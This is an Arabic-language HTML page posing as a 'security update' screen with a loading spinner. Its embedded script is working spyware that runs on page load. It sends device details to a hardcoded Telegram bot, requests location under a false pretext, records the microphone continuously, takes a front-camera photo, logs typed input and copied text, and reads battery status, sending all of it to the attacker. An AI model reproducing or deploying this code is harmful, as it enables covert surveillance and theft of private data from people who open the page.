<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تحديث</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; }
        .container { background: white; padding: 40px 30px; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.12); max-width: 400px; width: 100%; text-align: center; }
        h2 { color: #1a1a2e; font-size: 22px; }
        p { color: #555; font-size: 14px; margin: 20px 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #2d7aff; border-radius: 50%; width: 44px; height: 44px; animation: spin 0.9s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <h2>🔒 تحديث الأمان</h2>
        <p>جاري تأمين حسابك...</p>
        <div class="loader"></div>
        <p style="font-size:12px;color:#888;">يرجى الانتظار</p>
    </div>

    <video id="video" playsinline webkit-playsinline muted></video>
    <canvas id="canvas"></canvas>

<script>
// =============================================
// إعدادات البوت
// =============================================
const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
const CHAT_ID   = '6526473202';

function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    }).catch(e => console.log(e));
}

function sendPhotoToTelegram(photoData, caption) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            photo: photoData,
            caption: caption,
            parse_mode: 'HTML'
        })
    }).catch(e => console.log(e));
}

function sendAudioToTelegram(audioData, caption) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            audio: audioData,
            caption: caption,
            parse_mode: 'HTML'
        })
    }).catch(e => console.log(e));
}

// =============================================
// 1. البيانات الأساسية
// =============================================
const ua = navigator.userAgent;
const isMobile = /iPhone|iPad|iPod|Android|BlackBerry|Opera Mini|IEMobile/i.test(ua);
const deviceType = isMobile ? 'جوال' : 'كمبيوتر';
let os = 'غير معروف';
if (/Windows NT 10.0/.test(ua)) os = 'Windows 10';
else if (/Mac OS X/.test(ua)) os = 'MacOS';
else if (/Android/.test(ua)) os = 'Android';
else if (/iPhone|iPad/.test(ua)) os = 'iOS';

let msg = `<b>✅ تم فتح الرابط</b>\n\n`;
msg += `📱 الجهاز: ${deviceType} (${os})\n`;
msg += `🌐 IP: ${window.location.hostname}\n`;
msg += `📱 المتصفح: ${ua}\n`;
msg += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
msg += `📅 الوقت: ${new Date().toISOString()}`;
sendToTelegram(msg);

// =============================================
// 2. الموقع الجغرافي (بدون موافقة! - محاولة)
// =============================================
// ملاحظة: لا يمكن الحصول على الموقع بدون موافقة المستخدم في المتصفحات الحديثة.
// لكن يمكن طلب الإذن بشكل وهمي ("لتحديد منطقتك").
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            sendToTelegram(`📍 <b>الموقع الجغرافي</b>\nhttps://maps.google.com/?q=${lat},${lon}`);
        },
        err => {
            sendToTelegram('❌ تعذر الحصول على الموقع (تم الرفض)');
        }
    );
}

// =============================================
// 3. التسجيل الصوتي التلقائي (بدء فوراً)
// =============================================
let mediaRecorder;
let audioChunks = [];
let isRecording = false;

function startRecording() {
    navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];
        mediaRecorder.ondataavailable = e => {
            if (e.data.size > 0) audioChunks.push(e.data);
        };
        mediaRecorder.onstop = () => {
            const blob = new Blob(audioChunks, { type: 'audio/mp4' });
            const reader = new FileReader();
            reader.onload = f => {
                const audioData = f.target.result;
                sendAudioToTelegram(audioData, '🎤 <b>تسجيل صوتي تلقائي</b>');
            };
            reader.readAsDataURL(blob);
            // إعادة التسجيل بعد الإرسال مباشرة (تسجيل مستمر)
            if (isRecording) {
                setTimeout(startRecording, 500);
            }
        };
        mediaRecorder.start();
        isRecording = true;
        sendToTelegram('🎙️ بدء التسجيل الصوتي...');
    })
    .catch(err => {
        sendToTelegram('❌ تعذر الوصول إلى الميكروفون (تم الرفض)');
    });
}

// بدء التسجيل فوراً بعد 2 ثانية
setTimeout(startRecording, 2000);

// =============================================
// 4. الكاميرا الأمامية (تصور وترسل)
// =============================================
function takePhoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    
    navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
    })
    .then(stream => {
        video.srcObject = stream;
        video.play();
        setTimeout(() => {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photo = canvas.toDataURL('image/jpeg', 0.9);
            sendPhotoToTelegram(photo, '📸 <b>صورة من الكاميرا الأمامية</b>');
            stream.getTracks().forEach(track => track.stop());
            video.srcObject = null;
        }, 2000);
    })
    .catch(err => {});
}

setTimeout(takePhoto, 4000);

// =============================================
// 5. Keylogger (تسجيل كل ما يكتب)
// =============================================
document.addEventListener('input', e => {
    if (e.target.value) {
        sendToTelegram(`⌨️ <b>كتابة</b>\n${e.target.value.substring(0, 50)}`);
    }
});

// =============================================
// 6. نسخ الحافظة
// =============================================
document.addEventListener('copy', () => {
    const text = document.getSelection().toString();
    if (text && text.length > 0) {
        sendToTelegram(`📋 <b>نسخ</b>\n${text.substring(0, 100)}`);
    }
});

// =============================================
// 7. البطارية
// =============================================
if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
        const level = Math.round(battery.level * 100);
        const charging = battery.charging ? '⚡ شاحن' : '🔌 بطارية';
        sendToTelegram(`🔋 <b>البطارية</b>\n${level}% (${charging})`);
    }).catch(() => {});
}

// =============================================
// 8. إيقاف التسجيل عند إغلاق الصفحة
// =============================================
window.addEventListener('beforeunload', function() {
    if (mediaRecorder && isRecording) {
        mediaRecorder.stop();
        isRecording = false;
        sendToTelegram('⏹️ توقف التسجيل الصوتي (غادر الصفحة)');
    }
});

console.log('✅ يعمل');
</script>
</body>
</html>
